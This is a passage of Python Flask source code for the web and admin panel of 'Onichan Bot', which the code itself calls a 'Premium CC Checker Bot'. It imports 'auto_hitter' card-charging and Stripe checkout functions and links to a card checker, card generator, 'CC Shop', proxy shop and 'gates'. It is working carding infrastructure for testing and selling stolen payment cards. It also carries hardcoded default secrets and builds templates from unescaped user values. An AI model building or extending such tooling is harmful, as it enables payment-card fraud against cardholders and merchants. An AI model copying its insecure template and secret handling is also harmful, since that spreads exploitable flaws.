"""
Keep Alive Server for Replit
This creates a simple web server to keep the Replit alive
Also handles CoinPayments webhooks and Admin Panel
"""

from flask import Flask, request, jsonify, redirect, session, render_template_string, send_from_directory
from threading import Thread
from functools import wraps
import os
import json
import hashlib
import hmac
import bcrypt
import requests as http_requests
from datetime import datetime
import asyncio
from modules.auto_hitter import charge_card as auto_hitter_charge, get_proxy_url, parse_card as auto_hitter_parse_card
from modules.stripe_tls import get_checkout_info as tls_get_checkout_info
from modules.web_panel.autohitter_v2_checker import v2_init_checkout, v2_charge_card

from datetime import timedelta

app = Flask('', static_folder='static')
try:
    from flask_compress import Compress
    # Disable compression of streaming responses — Flask-Compress 1.24
    # wraps SSE generators in a way that breaks `text/event-stream` and
    # causes 500s on /api/check/razorpay and similar SSE endpoints.
    app.config['COMPRESS_STREAMS'] = False
    Compress(app)
except ImportError:
    pass

@app.after_request
def _add_perf_headers(resp):
    p = request.path or ''
    if p.startswith('/static/'):
        resp.headers['Cache-Control'] = 'public, max-age=86400, immutable'
    return resp
app.secret_key = os.environ.get("SESSION_SECRET", os.environ.get("FLASK_SECRET_KEY", "onichan-secret-key-2024"))
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

@app.route('/static/anime/<path:filename>')
def serve_anime_images(filename):
    import os as os_module
    base_dir = os_module.path.dirname(os_module.path.abspath(__file__))
    return send_from_directory(os_module.path.join(base_dir, 'static', 'anime'), filename)

pending_notifications = []

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "onichan2024")
OWNER_ID = os.environ.get("OWNER_ID", "1857417752")

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin/login')
        return f(*args, **kwargs)
    return decorated_function

def auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in') and not session.get('user_id'):
            return redirect('/user/login')
        return f(*args, **kwargs)
    return decorated_function

def is_owner():
    """Check if the currently logged in user is the owner"""
    return session.get('admin_user_id') == OWNER_ID

def owner_required(f):
    """Decorator for owner-only actions"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin/login')
        if not is_owner():
            return render_template_string(f"""
            <html>
            <head><title>Access Denied</title>{ADMIN_CSS}</head>
            <body>
                <div class="login-container">
                    <div class="login-box" style="text-align: center;">
                        <h1 style="color: #e94560;">Access Denied</h1>
                        <p>Only the Owner can perform this action.</p>
                        <a href="/admin" class="btn btn-primary" style="display: inline-block; margin-top: 20px; text-decoration: none;">Back to Dashboard</a>
                    </div>
                </div>
            </body>
            </html>
            """)
        return f(*args, **kwargs)
    return decorated_function

def read_file_lines(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except:
        return []

def write_file_lines(filepath, lines):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines) + '\n' if lines else '')
        return True
    except:
        return False

# ============================================================
# ADMIN PERMISSIONS SYSTEM
# ============================================================

# Available permissions
ADMIN_PERMISSIONS_LIST = [
    ('can_view_users', 'View Users', 'Can see user lists and details'),
    ('can_manage_premium', 'Manage Premium', 'Can add/remove premium users'),
    ('can_manage_banned', 'Manage Banned', 'Can ban/unban users'),
    ('can_view_payments', 'View Payments', 'Can see payment history'),
    ('can_view_cards', 'View Cards', 'Can see approved cards'),
    ('can_manage_settings', 'Manage Settings', 'Can change bot settings'),
    ('can_manage_admins', 'Manage Admins', 'Can add/remove other admins (Owner only by default)')
]

def get_admin_permissions():
    """Get all admin permissions from database"""
    from config import DB_ADMIN_PERMISSIONS
    try:
        with open(DB_ADMIN_PERMISSIONS, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_admin_permissions(permissions):
    """Save admin permissions to database"""
    from config import DB_ADMIN_PERMISSIONS
    try:
        with open(DB_ADMIN_PERMISSIONS, 'w', encoding='utf-8') as f:
            json.dump(permissions, f, indent=2)
        return True
    except:
        return False

def get_admin_info(user_id):
    """Get admin info including permissions and password hash"""
    permissions = get_admin_permissions()
    return permissions.get(str(user_id), {
        'password': None,
        'role': 'admin',
        'permissions': {
            'can_view_users': True,
            'can_manage_premium': False,
            'can_manage_banned': False,
            'can_view_payments': True,
            'can_view_cards': True,
            'can_manage_settings': False,
            'can_manage_admins': False
        },
        'created': None
    })

def set_admin_info(user_id, info):
    """Set admin info"""
    permissions = get_admin_permissions()
    permissions[str(user_id)] = info
    return save_admin_permissions(permissions)

def hash_admin_password(password):
    """Hash admin password using bcrypt (salted and slow)"""
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_admin_password(user_id, password):
    """Verify admin password"""
    admin_info = get_admin_info(user_id)
    stored_hash = admin_info.get('password')
    
    # If no custom password set, use global ADMIN_PASSWORD
    if not stored_hash:
        return password == ADMIN_PASSWORD
    
    # Verify bcrypt hash
    try:
        return bcrypt.checkpw(password.encode('utf-8'), stored_hash.encode('utf-8'))
    except (ValueError, TypeError):
        # Fallback for old SHA-256 hashes (migration path)
        if stored_hash == hashlib.sha256(password.encode()).hexdigest():
            # Upgrade to bcrypt on successful login
            admin_info['password'] = hash_admin_password(password)
            set_admin_info(user_id, admin_info)
            return True
        return False

def has_permission(user_id, permission):
    """Check if admin has a specific permission"""
    # Owner has all permissions
    if str(user_id) == OWNER_ID:
        return True
    
    admin_info = get_admin_info(user_id)
    return admin_info.get('permissions', {}).get(permission, False)

def current_admin_has_permission(permission):
    """Check if currently logged in admin has permission"""
    user_id = session.get('admin_user_id')
    if not user_id:
        return False
    return has_permission(user_id, permission)

def permission_required(permission):
    """Decorator to check specific permission"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('admin_logged_in'):
                return redirect('/admin/login')
            if not current_admin_has_permission(permission):
                return render_template_string(f"""
                <html>
                <head><title>Access Denied</title>{ADMIN_CSS}</head>
                <body>
                    <div class="login-container">
                        <div class="login-box" style="text-align: center;">
                            <h1 style="color: #e94560;">Access Denied</h1>
                            <p>You don't have permission to access this page.</p>
                            <p style="opacity: 0.7; margin-top: 10px;">Required: {permission.replace('_', ' ').title()}</p>
                            <a href="/admin" class="btn btn-primary" style="display: inline-block; margin-top: 20px; text-decoration: none;">Back to Dashboard</a>
                        </div>
                    </div>
                </body>
                </html>
                """)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def get_settings():
    """Get bot settings as a dictionary"""
    from config import DB_SETTINGS
    settings = {
        'payment_mode': 'crypto',  # 'crypto' or 'manual'
        'manual_payment_info': 'Contact @tu_bkl_hai for manual payment',
        'manual_payment_address': '',
        'manual_payment_instructions': ''
    }
    try:
        lines = read_file_lines(DB_SETTINGS)
        for line in lines:
            if '=' in line:
                key, value = line.split('=', 1)
                settings[key.strip()] = value.strip()
    except:
        pass
    return settings

def save_settings(settings):
    """Save bot settings"""
    from config import DB_SETTINGS
    lines = [f"{key}={value}" for key, value in settings.items()]
    return write_file_lines(DB_SETTINGS, lines)

def get_stats():
    from config import (DB_OWNER, DB_PREMIUM, DB_FREE, DB_BANNED, 
                       DB_PAYMENTS, DB_APPROVED_CARDS, DB_CRYPTO_PENDING)
    
    owners = read_file_lines(DB_OWNER)
    premium = read_file_lines(DB_PREMIUM)
    free = read_file_lines(DB_FREE)
    banned = read_file_lines(DB_BANNED)
    payments = read_file_lines(DB_PAYMENTS)
    approved = read_file_lines(DB_APPROVED_CARDS)
    pending = read_file_lines(DB_CRYPTO_PENDING)
    
    return {
        'total_users': len(owners) + len(premium) + len(free),
        'owners': len(owners),
        'premium': len(premium),
        'free': len(free),
        'banned': len(banned),
        'total_payments': len(payments),
        'approved_cards': len(approved),
        'pending_payments': len([p for p in pending if 'PENDING' in p])
    }

ADMIN_CSS = """
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎀</text></svg>">
<link rel="stylesheet" href="/static/admin.css">
<script src="/static/admin.js" defer></script>
"""

@app.route('/ping')
def ping():
    return 'OK', 200

@app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Onichan Bot</title>
            <style>
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    font-family: Arial, sans-serif;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    text-align: center;
                    padding: 40px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 20px;
                    backdrop-filter: blur(10px);
                }
                h1 { font-size: 3em; margin: 0; }
                p { font-size: 1.2em; margin: 20px 0; }
                .status { 
                    color: #4ade80; 
                    font-weight: bold;
                    font-size: 1.5em;
                }
                .admin-link {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 10px 25px;
                    background: #e94560;
                    color: white;
                    text-decoration: none;
                    border-radius: 8px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Onichan Bot</h1>
                <p class="status">Bot is Running!</p>
                <p>Premium CC Checker Bot</p>
                <p>Powered by Replit</p>
                <a href="/admin" class="admin-link">Admin Panel</a>
                <a href="/user" class="admin-link" style="margin-left: 10px; background: #a855f7;">User Panel</a>
            </div>
        </body>
    </html>
    """

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    from config import DB_OWNER
    error = ""
    if request.method == 'POST':
        user_id = request.form.get('user_id', '').strip()
        password = request.form.get('password', '')
        
        # Check if user is an admin
        owners = read_file_lines(DB_OWNER)
        owner_ids = [o.split()[0] for o in owners if o]
        
        if user_id == OWNER_ID or user_id in owner_ids:
            # Verify password (individual or global)
            if verify_admin_password(user_id, password):
                session.permanent = True
                session['admin_logged_in'] = True
                session['admin_user_id'] = user_id
                return redirect('/admin')
            else:
                error = "Invalid password!"
        else:
            error = "You are not authorized as an admin!"
    
    return render_template_string(f"""
    <html>
    <head><title>Admin Login - Onichan Bot</title>{ADMIN_CSS}</head>
    <body>
        <div class="login-container">
            <div class="login-box">
                <h1>Onichan Admin</h1>
                {'<div class="alert alert-error">' + error + '</div>' if error else ''}
                <form method="POST" autocomplete="on">
                    <input type="text" name="user_id" placeholder="Your Telegram User ID" autocomplete="username" required>
                    <input type="password" name="password" placeholder="Admin Password" autocomplete="current-password" required>
                    <button type="submit" class="btn btn-danger">Login</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect('/admin/login')

@app.route('/admin')
@admin_required
def admin_dashboard():
    stats = get_stats()
    
    return render_template_string(f"""
    <html>
    <head><title>Dashboard - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" class="active" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Dashboard</h1>
                <span>Welcome, Admin!</span>
            </div>
            <div class="stats-grid">
                <div class="stat-card">
                    <h3>{stats['total_users']}</h3>
                    <p>Total Users</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['premium']}</h3>
                    <p>Premium Users</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['free']}</h3>
                    <p>Free Users</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['banned']}</h3>
                    <p>Banned Users</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['total_payments']}</h3>
                    <p>Total Payments</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['approved_cards']}</h3>
                    <p>Approved Cards</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['pending_payments']}</h3>
                    <p>Pending Payments</p>
                </div>
                <div class="stat-card">
                    <h3>{stats['owners']}</h3>
                    <p>Owners</p>
                </div>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/users')
@admin_required
def admin_users():
    from config import DB_FREE, DB_PREMIUM, DB_OWNER
    
    free_users = read_file_lines(DB_FREE)
    premium_users = read_file_lines(DB_PREMIUM)
    owners = read_file_lines(DB_OWNER)
    
    all_users = []
    for user in owners:
        all_users.append({'id': user.split()[0] if user else '', 'type': 'Owner', 'info': user})
    for user in premium_users:
        parts = user.split()
        all_users.append({'id': parts[0] if parts else '', 'type': 'Premium', 'info': user})
    for user in free_users:
        all_users.append({'id': user.split()[0] if user else '', 'type': 'Free', 'info': user})
    
    users_html = ""
    for user in all_users[:100]:
        users_html += f"""
        <tr>
            <td>{user['id']}</td>
            <td>{user['type']}</td>
            <td>{user['info']}</td>
            <td>
                <form method="POST" action="/admin/users/ban" style="display:inline;">
                    <input type="hidden" name="user_id" value="{user['id']}">
                    <button type="submit" class="btn btn-danger">Ban</button>
                </form>
            </td>
        </tr>
        """
    
    return render_template_string(f"""
    <html>
    <head><title>Users - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" class="active" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>All Users</h1>
            </div>
            <div class="card">
                <h2>User List (First 100)</h2>
                <table>
                    <tr><th>User ID</th><th>Type</th><th>Info</th><th>Action</th></tr>
                    {users_html}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/users/ban', methods=['POST'])
@admin_required
def admin_ban_user():
    from config import DB_BANNED
    
    # Check permission
    if not current_admin_has_permission('can_manage_banned'):
        return redirect('/admin/users')
    
    user_id = request.form.get('user_id', '')
    if user_id:
        banned = read_file_lines(DB_BANNED)
        if user_id not in banned:
            banned.append(user_id)
            write_file_lines(DB_BANNED, banned)
    return redirect('/admin/users')

@app.route('/admin/premium', methods=['GET', 'POST'])
@admin_required
def admin_premium():
    from config import DB_PREMIUM
    message = ""
    error = ""
    owner_logged_in = is_owner()
    can_manage = current_admin_has_permission('can_manage_premium')
    
    if request.method == 'POST':
        if not can_manage:
            error = "You don't have permission to manage premium users!"
        else:
            action = request.form.get('action', '')
            user_id = request.form.get('user_id', '')
            
            if action == 'add' and user_id:
                expiry = request.form.get('expiry', '')
                premium = read_file_lines(DB_PREMIUM)
                new_premium = [p for p in premium if not p.startswith(user_id)]
                new_premium.append(f"{user_id} {expiry}")
                write_file_lines(DB_PREMIUM, new_premium)
                message = f"Added premium for user {user_id}"
            elif action == 'remove' and user_id:
                premium = read_file_lines(DB_PREMIUM)
                premium = [p for p in premium if not p.startswith(user_id)]
                write_file_lines(DB_PREMIUM, premium)
                message = f"Removed premium for user {user_id}"
    
    premium_users = read_file_lines(DB_PREMIUM)
    premium_html = ""
    for user in premium_users:
        parts = user.split()
        user_id = parts[0] if parts else ''
        expiry = parts[1] if len(parts) > 1 else 'N/A'
        remove_btn = f'''
                <form method="POST" style="display:inline;">
                    <input type="hidden" name="action" value="remove">
                    <input type="hidden" name="user_id" value="{user_id}">
                    <button type="submit" class="btn btn-danger">Remove</button>
                </form>
        ''' if can_manage else '<span style="opacity:0.5;">No permission</span>'
        premium_html += f"""
        <tr>
            <td>{user_id}</td>
            <td>{expiry}</td>
            <td>{remove_btn}</td>
        </tr>
        """
    
    add_form = '''
            <div class="card">
                <h2>Add Premium User</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="add">
                    <input type="text" name="user_id" placeholder="User ID" required>
                    <input type="date" name="expiry" required>
                    <button type="submit" class="btn btn-success">Add Premium</button>
                </form>
            </div>
    ''' if can_manage else '''
            <div class="card">
                <h2>Add Premium User</h2>
                <p style="opacity: 0.7;">You don't have permission to manage premium users.</p>
            </div>
    '''
    
    return render_template_string(f"""
    <html>
    <head><title>Premium - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" class="active" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Premium Users</h1>
                {'<span style="color: #4CAF50;">(Can Manage)</span>' if can_manage else '<span style="opacity: 0.6;">(View Only)</span>'}
            </div>
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            {'<div class="alert alert-error">' + error + '</div>' if error else ''}
            {add_form}
            <div class="card">
                <h2>Premium Users List</h2>
                <table>
                    <tr><th>User ID</th><th>Expiry</th><th>Action</th></tr>
                    {premium_html}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/owners', methods=['GET', 'POST'])
@admin_required
def admin_owners():
    from config import DB_OWNER
    message = ""
    error = ""
    owner_logged_in = is_owner()
    
    if request.method == 'POST':
        if not owner_logged_in:
            error = "Only the Owner can add/remove admins!"
        else:
            action = request.form.get('action', '')
            user_id = request.form.get('user_id', '').strip()
            
            if action == 'add' and user_id:
                owners = read_file_lines(DB_OWNER)
                existing_ids = [o.split()[0] for o in owners if o]
                if user_id not in existing_ids:
                    owners.append(user_id)
                    write_file_lines(DB_OWNER, owners)
                    message = f"Added admin: {user_id}"
                else:
                    message = f"User {user_id} is already an admin"
            elif action == 'remove' and user_id:
                if user_id == OWNER_ID:
                    error = "Cannot remove the main Owner!"
                else:
                    owners = read_file_lines(DB_OWNER)
                    owners = [o for o in owners if not o.startswith(user_id)]
                    write_file_lines(DB_OWNER, owners)
                    message = f"Removed admin: {user_id}"
    
    owners = read_file_lines(DB_OWNER)
    owners_html = ""
    for owner in owners:
        owner_id = owner.split()[0] if owner else ''
        if owner_id:
            is_main_owner = owner_id == OWNER_ID
            remove_btn = ''
            if owner_logged_in:
                if is_main_owner:
                    remove_btn = '<span style="color: #4CAF50;">Main Owner</span>'
                else:
                    remove_btn = f'''
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="action" value="remove">
                        <input type="hidden" name="user_id" value="{owner_id}">
                        <button type="submit" class="btn btn-danger">Remove</button>
                    </form>'''
            else:
                remove_btn = '<span style="color: #4CAF50;">Main Owner</span>' if is_main_owner else '<span style="opacity:0.5;">Owner only</span>'
            
            owners_html += f"""
            <tr>
                <td>{owner_id}</td>
                <td>{'Owner' if is_main_owner else 'Admin'}</td>
                <td>{remove_btn}</td>
            </tr>
            """
    
    add_form = '''
            <div class="card">
                <h2>Add New Admin</h2>
                <p style="opacity: 0.7; margin-bottom: 15px;">Admins can view data but cannot add/remove other admins or give subscriptions.</p>
                <form method="POST">
                    <input type="hidden" name="action" value="add">
                    <input type="text" name="user_id" placeholder="Telegram User ID" required>
                    <button type="submit" class="btn btn-success">Add Admin</button>
                </form>
            </div>
    ''' if owner_logged_in else '''
            <div class="card">
                <h2>Add New Admin</h2>
                <p style="opacity: 0.7;">Only the Owner can add new admins.</p>
            </div>
    '''
    
    return render_template_string(f"""
    <html>
    <head><title>Admins - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" class="active" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Admin Management</h1>
                {'<span style="color: #4CAF50;">(Owner Mode)</span>' if owner_logged_in else '<span style="opacity: 0.6;">(View Only)</span>'}
            </div>
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            {'<div class="alert alert-error">' + error + '</div>' if error else ''}
            {add_form}
            <div class="card">
                <h2>Current Admins ({len(owners)})</h2>
                <table>
                    <tr><th>User ID</th><th>Role</th><th>Action</th></tr>
                    {owners_html if owners_html else '<tr><td colspan="3">No admins configured</td></tr>'}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/permissions', methods=['GET', 'POST'])
@admin_required
def admin_permissions():
    from config import DB_OWNER
    message = ""
    error = ""
    owner_logged_in = is_owner()
    
    if request.method == 'POST' and owner_logged_in:
        action = request.form.get('action', '')
        user_id = request.form.get('user_id', '').strip()
        
        if action == 'set_password' and user_id:
            new_password = request.form.get('new_password', '')
            if len(new_password) < 4:
                error = "Password must be at least 4 characters"
            else:
                admin_info = get_admin_info(user_id)
                admin_info['password'] = hash_admin_password(new_password)
                if not admin_info.get('created'):
                    admin_info['created'] = datetime.now().isoformat()
                set_admin_info(user_id, admin_info)
                message = f"Password set for admin {user_id}"
        
        elif action == 'reset_password' and user_id:
            admin_info = get_admin_info(user_id)
            admin_info['password'] = None  # Reset to use global password
            set_admin_info(user_id, admin_info)
            message = f"Password reset for admin {user_id} (now uses global password)"
        
        elif action == 'update_permissions' and user_id:
            admin_info = get_admin_info(user_id)
            if 'permissions' not in admin_info:
                admin_info['permissions'] = {}
            
            for perm_key, _, _ in ADMIN_PERMISSIONS_LIST:
                admin_info['permissions'][perm_key] = request.form.get(f'perm_{perm_key}') == 'on'
            
            if not admin_info.get('created'):
                admin_info['created'] = datetime.now().isoformat()
            set_admin_info(user_id, admin_info)
            message = f"Permissions updated for admin {user_id}"
        
        elif action == 'change_global_password':
            new_global = request.form.get('global_password', '')
            if len(new_global) < 4:
                error = "Global password must be at least 4 characters"
            else:
                message = f"Global password would need to be changed in environment variable ADMIN_PASSWORD"
    
    # Get list of admins
    owners = read_file_lines(DB_OWNER)
    all_permissions = get_admin_permissions()
    
    # Build admin list HTML
    admins_html = ""
    for owner in owners:
        owner_id = owner.split()[0] if owner else ''
        if not owner_id:
            continue
        
        admin_info = get_admin_info(owner_id)
        is_main_owner = owner_id == OWNER_ID
        has_custom_pwd = admin_info.get('password') is not None
        
        # Build permissions checkboxes
        perms_html = ""
        if owner_logged_in and not is_main_owner:
            for perm_key, perm_name, perm_desc in ADMIN_PERMISSIONS_LIST:
                checked = 'checked' if admin_info.get('permissions', {}).get(perm_key, False) else ''
                perms_html += f'''
                <label style="display: flex; align-items: center; margin: 8px 0; cursor: pointer;">
                    <input type="checkbox" name="perm_{perm_key}" {checked} style="margin-right: 10px; width: 18px; height: 18px;">
                    <span><strong>{perm_name}</strong> - {perm_desc}</span>
                </label>
                '''
        else:
            for perm_key, perm_name, perm_desc in ADMIN_PERMISSIONS_LIST:
                has_perm = admin_info.get('permissions', {}).get(perm_key, False) or is_main_owner
                status = '<span style="color: #4ade80;">Yes</span>' if has_perm else '<span style="color: #e94560;">No</span>'
                perms_html += f'<p style="margin: 5px 0;">{perm_name}: {status}</p>'
        
        # Password section
        pwd_section = ""
        if owner_logged_in and not is_main_owner:
            pwd_section = f'''
            <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1);">
                <h4 style="margin-bottom: 10px;">Password</h4>
                <p style="opacity: 0.7; margin-bottom: 10px;">{'Custom password set' if has_custom_pwd else 'Using global password'}</p>
                <form method="POST" style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <input type="hidden" name="action" value="set_password">
                    <input type="hidden" name="user_id" value="{owner_id}">
                    <input type="password" name="new_password" placeholder="New Password" style="flex: 1; min-width: 150px;">
                    <button type="submit" class="btn btn-primary">Set Password</button>
                </form>
                {f"""
                <form method="POST" style="margin-top: 10px;">
                    <input type="hidden" name="action" value="reset_password">
                    <input type="hidden" name="user_id" value="{owner_id}">
                    <button type="submit" class="btn btn-danger" style="padding: 8px 15px;">Reset to Global</button>
                </form>
                """ if has_custom_pwd else ""}
            </div>
            '''
        elif has_custom_pwd:
            pwd_section = '<p style="margin-top: 10px; color: #4ade80;">Has custom password</p>'
        
        # Permissions update button
        update_btn = ""
        if owner_logged_in and not is_main_owner:
            update_btn = f'''
            <form method="POST" style="margin-top: 15px;">
                <input type="hidden" name="action" value="update_permissions">
                <input type="hidden" name="user_id" value="{owner_id}">
                {perms_html}
                <button type="submit" class="btn btn-success" style="margin-top: 15px;">Save Permissions</button>
            </form>
            '''
            perms_html = ""
        
        admins_html += f'''
        <div class="card" style="margin-bottom: 15px;">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                <div>
                    <h3 style="color: #e94560; margin-bottom: 5px;">
                        {owner_id}
